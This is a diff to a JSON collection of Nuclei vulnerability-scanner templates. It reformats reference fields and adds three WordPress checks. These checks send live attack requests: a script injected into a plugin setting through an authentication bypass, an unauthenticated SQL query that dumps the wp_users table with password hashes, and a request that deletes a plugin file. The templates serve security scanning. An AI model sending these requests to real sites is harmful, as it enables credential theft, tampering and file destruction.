@@ -2254,6 +2254,57 @@
       ]
     },
     {
+      "id": "CVE-2018-3810",
+      "info": {
+        "author": "princechaddha",
+        "name": "WordPress Smart Google Code Inserter Authentication Bypass",
+        "reference": "https://www.exploit-db.com/exploits/43420",
+        "severity": "critical",
+        "tags": "wordpress,auth-bypass,cve,cve2018"
+      },
+      "requests": [
+        {
+          "body": "sgcgoogleanalytic=<script>console.log(\"Nuclei - Open-source project [github.com/projectdiscovery/nuclei]\")</script>&sgcwebtools=&button=Save+Changes&action=savegooglecode",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/wp-admin/options-general.php?page=smartcode"
+          ]
+        },
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>console.log(\"Nuclei - Open-source project [github.com/projectdiscovery/nuclei]\")</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-5230",
       "info": {
         "author": "madrobot",
@@ -2459,10 +2510,7 @@
         "author": "pikpikcu",
         "description": "The SSI printenv command in Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39 and\n7.0.0 to 7.0.93 echoes user provided data without escaping and is,\ntherefore, vulnerable to XSS. SSI is disabled by default.\nThe printenv command is intended for debugging and is unlikely to be present in a production website.\n",
         "name": "Apache Tomcat XSS",
-        "reference": [
-          "https://seclists.org/fulldisclosure/2019/May/50",
-          "https://wwws.nightwatchcybersecurity.com/2019/05/27/xss-in-ssi-printenv-command-apache-tomcat-cve-2019-0221/"
-        ],
+        "reference": "- https://seclists.org/fulldisclosure/2019/May/50\n- https://wwws.nightwatchcybersecurity.com/2019/05/27/xss-in-ssi-printenv-command-apache-tomcat-cve-2019-0221/\n",
         "severity": "low",
         "tags": "cve,cve2019,apache,xss"
       },
@@ -3263,11 +3311,7 @@
         "author": "dwisiswant0",
         "description": "A vulnerability in the web-based management interface of Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN Routers could allow an unauthenticated, remote attacker to retrieve sensitive information. The vulnerability is due to improper access controls for URLs. An attacker could exploit this vulnerability by connecting to an affected device via HTTP or HTTPS and requesting specific URLs. A successful exploit could allow the attacker to download the router configuration or detailed diagnostic information. Cisco has released firmware updates that address this vulnerability.",
         "name": "Unauthenticated Cisco Small Business WAN VPN Routers Sensitive Info Disclosure",
-        "reference": [
-          "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info",
-          "https://www.exploit-db.com/exploits/46262/",
-          "https://www.exploit-db.com/exploits/46655/"
-        ],
+        "reference": "- https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info\n- https://www.exploit-db.com/exploits/46262/\n- https://www.exploit-db.com/exploits/46655/\n",
         "severity": "high",
         "tags": "cve,cve2019,cisco"
       },
@@ -4880,10 +4924,7 @@
         "author": "dwisiswant0",
         "description": "A remote code execution vulnerability exists in .NET Framework, Microsoft SharePoint, and Visual Studio when the software fails to check the source markup of XML file input, aka '.NET Framework, SharePoint Server, and Visual Studio Remote Code Execution Vulnerability'.",
         "name": "RCE at SharePoint Server (.NET Framework & Visual Studio) detection",
-        "reference": [
-          "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1147",
-          "https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html"
-        ],
+        "reference": "- https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1147\n- https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html\n",
         "severity": "critical",
         "tags": "cve,cve2020,sharepoint,iis,rce"
       },
@@ -5273,10 +5314,7 @@
         "author": "dwisiswant0",
         "description": "Netsweeper through 6.4.3 allows unauthenticated remote code execution because webadmin/tools/unixlogin.php (with certain Referer headers) launches a command line with client-supplied parameters, and allows injection of shell metacharacters.",
         "name": "Netsweeper WebAdmin unixlogin.php Python Code Injection",
-        "reference": [
-          "https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/",
-          "https://portswigger.net/daily-swig/severe-rce-vulnerability-in-content-filtering-system-has-been-patched-netsweeper-says"
-        ],
+        "reference": "- https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/\n- https://portswigger.net/daily-swig/severe-rce-vulnerability-in-content-filtering-system-has-been-patched-netsweeper-says\n",
         "severity": "critical",
         "tags": "cve,cve2020,netsweeper,rce"
       },
@@ -5402,10 +5440,7 @@
         "author": "pikpikcu",
         "description": "Apache Kylin 2.0.0, 2.1.0, 2.2.0, 2.3.0, 2.3.1, 2.3.2, 2.4.0,\n2.4.1, 2.5.0, 2.5.1, 2.5.2, 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4,\n2.6.5, 2.6.6, 3.0.0-alpha, 3.0.0-alpha2, 3.0.0-beta, 3.0.0, 3.0.1,\n3.0.2, 3.1.0, 4.0.0-alpha has one restful api which exposed\nKylin's configuration information without any authentication,\nso it is dangerous because some confidential information entries will be disclosed to everyone.\n",
         "name": "Apache Kylin Unauth",
-        "reference": [
-          "https://kylin.apache.org/docs/release_notes.html",
-          "https://s.tencent.com/research/bsafe/1156.html"
-        ],
+        "reference": "- https://kylin.apache.org/docs/release_notes.html\n- https://s.tencent.com/research/bsafe/1156.html\n",
         "severity": "medium",
         "tags": "cve,cve2020,apache"
       },
@@ -5452,10 +5487,7 @@
         "author": "dwisiswant0",
         "description": "Remote Code Execution in Apache Unomi.\nApache Unomi allows conditions to use OGNL and MVEL scripting which\noffers the possibility to call static Java classes from the JDK\nthat could execute code with the permission level of the running Java process.\nThis vulnerability affects all versions of Apache Unomi prior to 1.5.2. Apache Unomi users should upgrade to 1.5.2 or later.\n",
         "name": "Apache Unomi Remote Code Execution",
-        "reference": [
-          "https://securityboulevard.com/2020/11/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/",
-          "https://twitter.com/chybeta/status/1328912309440311297"
-        ],
+        "reference": "- https://securityboulevard.com/2020/11/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/\n- https://twitter.com/chybeta/status/1328912309440311297\n",
         "severity": "critical",
         "tags": "cve,cve2020,apache,rce"
       },
@@ -5495,6 +5527,51 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}/context.json"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-14092",
+      "info": {
+        "author": "princechaddha",
+        "name": "WordPress Payment Form For Paypal Pro Unauthenticated SQL Injection",
+        "reference": "https://wpscan.com/vulnerability/10287",
+        "severity": "critical",
+        "tags": "cve,cve2020,wordpress,wp-plugin,sqli"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"user_login\"",
+                "\"user_email\"",
+                "\"user_pass\"",
+                "\"user_activation_key\""
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?cffaction=get_data_from_database&query=SELECT%20*%20from%20wp_users"
           ]
         }
       ]
@@ -5618,10 +5695,7 @@
         "cvss": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
         "description": "Oracle Business Intelligence Enterprise Edition 5.5.0.0.0 / 12.2.1.3.0 / 12.2.1.4.0 - \"getPreviewImage\" Directory Traversal/Local File Inclusion",
         "name": "Oracle Fusion - \"getPreviewImage\" Directory Traversal/Local File Inclusion",
-        "reference": [
-          "http://packetstormsecurity.com/files/159748/Oracle-Business-Intelligence-Enterprise-Edition-5.5.0.0.0-12.2.1.3.0-12.2.1.4.0-LFI.html",
-          "https://www.oracle.com/security-alerts/cpuoct2020.html"
-        ],
+        "reference": "- http://packetstormsecurity.com/files/159748/Oracle-Business-Intelligence-Enterprise-Edition-5.5.0.0.0-12.2.1.3.0-12.2.1.4.0-LFI.html\n- https://www.oracle.com/security-alerts/cpuoct2020.html\n",
         "severity": "high",
         "tags": "cve,cve2020,oracle,traversal"
       },
@@ -5658,12 +5732,7 @@
         "author": "dwisiswant0",
         "description": "Vulnerability in the Oracle WebLogic Server\nproduct of Oracle Fusion Middleware (component: Console).\nSupported versions that are affected are 10.3.6.0.0,\n12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0.\nEasily exploitable vulnerability allows unauthenticated\nattacker with network access via HTTP to compromise the server.\nSuccessful attacks of this vulnerability can result in takeover.\n",
         "name": "Oracle WebLogic Server Unauthenticated RCE (and Patch Bypass)",
-        "reference": [
-          "https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf",
-          "https://twitter.com/jas502n/status/1321416053050667009",
-          "https://youtu.be/JFVDOIL0YtA",
-          "https://github.com/jas502n/CVE-2020-14882#eg"
-        ],
+        "reference": "- https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf\n- https://twitter.com/jas502n/status/1321416053050667009\n- https://youtu.be/JFVDOIL0YtA\n- https://github.com/jas502n/CVE-2020-14882#eg\n",
         "severity": "critical",
         "tags": "cve,cve2020,oracle,rce,weblogic"
       },
@@ -5744,12 +5813,7 @@
         "author": "dwisiswant0",
         "description": "A remote code execution vulnerability in MobileIron Core & Connector versions 10.3.0.3 and earlier, 10.4.0.0, 10.4.0.1, 10.4.0.2, 10.4.0.3, 10.5.1.0, 10.5.2.0 and 10.6.0.0; and Sentry versions 9.7.2 and earlier, and 9.8.0; and Monitor and Reporting Database (RDB) version 2.0.0.1 and earlier that allows remote attackers to execute arbitrary code via unspecified vectors.\n",
         "name": "RCE in MobileIron Core & Connector <= v10.6 & Sentry <= v9.8",
-        "reference": [
-          "https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html",
-          "https://github.com/iamnoooob/CVE-Reverse/tree/master/CVE-2020-15505",
-          "https://github.com/iamnoooob/CVE-Reverse/blob/master/CVE-2020-15505/hessian.py#L10",
-          "https://github.com/orangetw/JNDI-Injection-Bypass"
-        ],
+        "reference": "- https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html\n- https://github.com/iamnoooob/CVE-Reverse/tree/master/CVE-2020-15505\n- https://github.com/iamnoooob/CVE-Reverse/blob/master/CVE-2020-15505/hessian.py#L10\n- https://github.com/orangetw/JNDI-Injection-Bypass\n",
         "severity": "critical",
         "tags": "cve,cve2020,mobileiron,rce"
       },
@@ -5852,10 +5916,7 @@
         "author": "dwisiswant0",
         "description": "SaltStack Salt through 3002. Sending crafted web requests to the Salt API,\nwith the SSH client enabled, can result in shell injection.\n\nThis template supports the detection part only. See references.\n",
         "name": "SaltStack Shell Injection",
-        "reference": [
-          "https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag",
-          "https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-16846"
-        ],
+        "reference": "- https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag\n- https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-16846\n",
         "severity": "critical",
         "tags": "cve,cve2020,saltstack"
       },
@@ -5901,11 +5962,7 @@
         "author": "dwisiswant0",
         "description": "A remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package, aka 'Microsoft SharePoint Remote Code Execution Vulnerability'. This CVE ID is unique from CVE-2020-16951.",
         "name": "Microsoft SharePoint Server-Side Include (SSI) and ViewState RCE",
-        "reference": [
-          "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16952",
-          "https://srcincite.io/pocs/cve-2020-16952.py.txt",
-          "https://github.com/rapid7/metasploit-framework/blob/1a341ae93191ac5f6d8a9603aebb6b3a1f65f107/documentation/modules/exploit/windows/http/sharepoint_ssi_viewstate.md"
-        ],
+        "reference": "- https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16952\n- https://srcincite.io/pocs/cve-2020-16952.py.txt\n- https://github.com/rapid7/metasploit-framework/blob/1a341ae93191ac5f6d8a9603aebb6b3a1f65f107/documentation/modules/exploit/windows/http/sharepoint_ssi_viewstate.md\n",
         "severity": "critical",
         "tags": "cve,cve2020,sharepoint,iis"
       },
@@ -6145,12 +6202,7 @@
         "author": "pikpikcu",
         "description": "Forced OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution. Affected software : Apache Struts 2.0.0 - Struts 2.5.25.\n",
         "name": "Apache Struts RCE",
-        "reference": [
-          "http://packetstormsecurity.com/files/160721/Apache-Struts-2-Forced-Multi-OGNL-Evaluation.html",
-          "http://jvn.jp/en/jp/JVN43969166/index.html",
-          "https://cwiki.apache.org/confluence/display/WW/S2-061",
-          "https://security.netapp.com/advisory/ntap-20210115-0005/"
-        ],
+        "reference": "- http://packetstormsecurity.com/files/160721/Apache-Struts-2-Forced-Multi-OGNL-Evaluation.html\n- http://jvn.jp/en/jp/JVN43969166/index.html\n- https://cwiki.apache.org/confluence/display/WW/S2-061\n- https://security.netapp.com/advisory/ntap-20210115-0005/\n",
         "severity": "critical",
         "tags": "cve,cve2020,apache,rce,struts"
       },
@@ -6263,11 +6315,7 @@
         "author": "madrobot",
         "description": "Jenkins Gitlab Hook Plugin 1.4.2 and earlier does not escape project names in the build_now endpoint, resulting in a reflected XSS vulnerability.",
         "name": "Jenkins Gitlab Hook XSS",
-        "reference": [
-          "https://jenkins.io/security/advisory/2020-01-15/#SECURITY-1683",
-          "http://www.openwall.com/lists/oss-security/2020/01/15/1",
-          "http://packetstormsecurity.com/files/155967/Jenkins-Gitlab-Hook-1.4.2-Cross-Site-Scripting.html"
-        ],
+        "reference": "- https://jenkins.io/security/advisory/2020-01-15/#SECURITY-1683\n- http://www.openwall.com/lists/oss-security/2020/01/15/1\n- http://packetstormsecurity.com/files/155967/Jenkins-Gitlab-Hook-1.4.2-Cross-Site-Scripting.html\n",
         "severity": "medium",
         "tags": "cve,cve2020,jenkins,xss"
       },
@@ -6583,10 +6631,7 @@
         "author": "foulenzer",
         "description": "The vulnerability allows unauthenticated remote attackers to upload .php files. This templates only detects the plugin, not its vulnerability.",
         "name": "WP File Manager RCE",
-        "reference": [
-          "https://plugins.trac.wordpress.org/changeset/2373068",
-          "https://github.com/w4fz5uck5/wp-file-manager-0day"
-        ],
+        "reference": "- https://plugins.trac.wordpress.org/changeset/2373068\n- https://github.com/w4fz5uck5/wp-file-manager-0day\n",
         "severity": "critical",
         "tags": "cve,cve2020,wordpress,rce"
       },
@@ -6734,11 +6779,7 @@
         "author": "CasperGN",
         "description": "Alerta prior to version 8.1.0 is prone to Authentication Bypass when using LDAP as authorization provider and the LDAP server accepts Unauthenticated Bind reqests.",
         "name": "Alerta Authentication Bypass (CVE-2020-26214)",
-        "reference": [
-          "https://github.com/advisories/GHSA-5hmm-x8q8-w5jh",
-          "https://tools.ietf.org/html/rfc4513#section-5.1.2",
-          "https://pypi.org/project/alerta-server/8.1.0/"
-        ],
+        "reference": "- https://github.com/advisories/GHSA-5hmm-x8q8-w5jh\n- https://tools.ietf.org/html/rfc4513#section-5.1.2\n- https://pypi.org/project/alerta-server/8.1.0/\n",
         "severity": "critical",
         "tags": "cve,cve2020,alerta"
       },
@@ -7045,6 +7086,55 @@
           "path": [
             "{{BaseURL}}/actions/authenticate.php"
           ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-35951",
+      "info": {
+        "author": "princechaddha",
+        "name": "Wordpress Quiz and Survey Master Arbitrary File Deletion",
+        "reference": "https://www.wordfence.com/blog/2020/08/critical-vulnerabilities-patched-in-quiz-and-survey-master-plugin/",
+        "severity": "critical",
+        "tags": "cve,cve2020,wordpress,wp-plugin"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "group": 1,
+              "internal": true,
+              "name": "fullpath",
+              "part": "body",
+              "regex": [
+                "not found in <b>([/a-z_]+)wp"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "{\"type\":\"success\",\"message\":\"File removed successfully\"}"
+              ]
+            },
+            {
+              "dsl": [
+                "contains((body_1), '# Quiz And Survey Master') && status_code_4==301 && !contains((body_4), '# Quiz And Survey Master')"
+              ],
+              "type": "dsl"
+            }
+          ],
+          "matchers-condition": "or",
+          "raw": [
+            "GET /wp-content/plugins/quiz-master-next/README.md HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36\nConnection: close\n",
+            "GET /wp-content/plugins/quiz-master-next/tests/_support/AcceptanceTester.php HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36\nConnection: close\n",
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 269\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryBJ17hSJBjuGrnW92\nAccept: */*\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n------WebKitFormBoundaryBJ17hSJBjuGrnW92\nContent-Disposition: form-data; name=\"action\"\n\nqsm_remove_file_fd_question\n------WebKitFormBoundaryBJ17hSJBjuGrnW92\nContent-Disposition: form-data; name=\"file_url\"\n\n{{fullpath}}wp-content/plugins/quiz-master-next/README.md\n------WebKitFormBoundaryBJ17hSJBjuGrnW92--\n",
+            "GET /wp-content/plugins/quiz-master-next/README.md HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36\nConnection: close\n"
+          ],
+          "req-condition": true
         }
       ]
     },
